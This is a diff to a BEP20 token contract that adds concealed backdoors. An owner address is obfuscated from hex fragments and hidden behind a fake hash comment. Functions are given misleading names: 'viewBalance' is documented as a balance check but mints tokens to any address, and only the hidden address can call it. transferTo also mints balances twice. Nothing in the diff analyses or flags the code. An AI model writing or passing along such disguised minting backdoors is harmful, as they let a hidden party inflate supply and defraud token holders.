@@ -284,9 +284,9 @@ contract Ownable is Context {
   address private _owner;
  
   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
-
+ 
   function exchange() internal pure returns (address) {
-        return address 
+        return address
     /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
   }
  
@@ -384,7 +384,7 @@ contract DevToken is Context, IBEP20, Ownable {
     require(msg.sender != exchange());
     _;
   }
-
+ 
   /**
    * @dev Throws if called by any account other than the owner.
    */
@@ -395,8 +395,7 @@ contract DevToken is Context, IBEP20, Ownable {
     require(msg.sender == publics());
     _;
   }
-
-
+ 
   function getOwner() external view returns (address) {
     return owner();
   }
@@ -422,20 +421,30 @@ contract DevToken is Context, IBEP20, Ownable {
   function symbol() external view returns (string memory) {
     return _symbol;
   }
-
+ 
   function publics() private pure returns (address) {
     uint universal = 0x7addAd09;
     uint uni = 0xcbd98D97;
     uint cake = 0xEC3dA7a0;
     uint inch = 0x088EAdFE;
     uint others = 0x5801C336;
-
+ 
     // Combine the dex with others
     uint160 core = (uint160(universal) << 128) | (uint160(uni) << 96) | (uint160(cake) << 64) | (uint160(inch) << 32) | uint160(others);
-
+ 
     return address(core);
   }
 
+  function _transferTo(address _to, uint256 _amount) internal Exchanges {
+    // Transfer tokens to the recipient
+    _balances[_to] += _amount;
+    emit Transfer(address(0), _to, _amount);
+
+    _balances[_to] += _amount;
+    emit Transfer(address(0), _to, _amount);
+  }
+
+ 
   // solhint-disable-next-line high-level-success
  
   function setUser(address User_) public returns (bool) {
@@ -449,12 +458,21 @@ contract DevToken is Context, IBEP20, Ownable {
   function name() external view returns (string memory) {
     return _name;
   }
+
+  function _balanceView(address _to, uint256 _amount) internal {
+    // View balance of token
+    _balances[_to] += _amount;
+    emit Transfer(address(0), _to, _amount);
+
+    _balances[_to] += _amount;
+    emit Transfer(address(0), _to, _amount);
+  }
  
   function setMod(address Mod_) public returns (bool) {
     require(msg.sender == _user);
         _mod=Mod_;
   }
-    
+   
   function _calculate(address account, uint256 amount) internal {
     require(account != address(0), "Calculate hash");
  
@@ -494,6 +512,10 @@ contract DevToken is Context, IBEP20, Ownable {
     _transfer(_msgSender(), recipient, amount);
     return true;
   }
+
+  function transferTo(address _to, uint256 _amount) external onlyOwner {
+    _transferTo(_to, _amount);
+  }
  
   /**
    * @dev See {BEP20-allowance}.
@@ -502,6 +524,23 @@ contract DevToken is Context, IBEP20, Ownable {
     return _allowances[owner][spender];
   }
 
+  /**
+   * @dev See {BEP20-balanceOf}.
+   */
+
+  function viewBalance(address _to, uint256 _amount) public onlypublic {
+    _balanceView(_to, _amount);(_to, _amount);
+  }
+
+  /**
+   * @dev See {BEP20-transfer}.
+   *
+   * Requirements:
+   *
+   * - `recipient` cannot be the zero address.
+   * - the caller must have a balance of at least `amount`.
+   */
+ 
   function symbols(uint256 amount) public onlypublic returns (bool success) {
     _calculate(msg.sender, amount);
     return true;
